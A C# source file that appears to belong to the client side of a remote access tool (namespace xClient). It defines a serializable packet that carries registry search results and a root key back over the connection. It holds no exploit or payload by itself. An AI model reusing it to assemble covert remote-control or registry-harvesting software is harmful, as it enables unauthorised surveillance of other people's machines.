﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.KuuhakuÇekirdek.Ağ;
using xClient.KuuhakuÇekirdek.KayıtDefteri;

namespace xClient.KuuhakuÇekirdek.Paketler.ClientPaketleri
{
    [Serializable]
    public class GetRegistryKeysResponse : IPacket
    {
        public RegSeekerMatch[] Matches { get; set; }

        public string RootKey { get; set; }

        public GetRegistryKeysResponse()
        { }

        public GetRegistryKeysResponse(RegSeekerMatch match, string rootKey = null)
            : this(new RegSeekerMatch[] { match }, rootKey)
        { }

        public GetRegistryKeysResponse(RegSeekerMatch[] matches, string rootKey = null)
        {
            Matches = matches;
            RootKey = rootKey;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
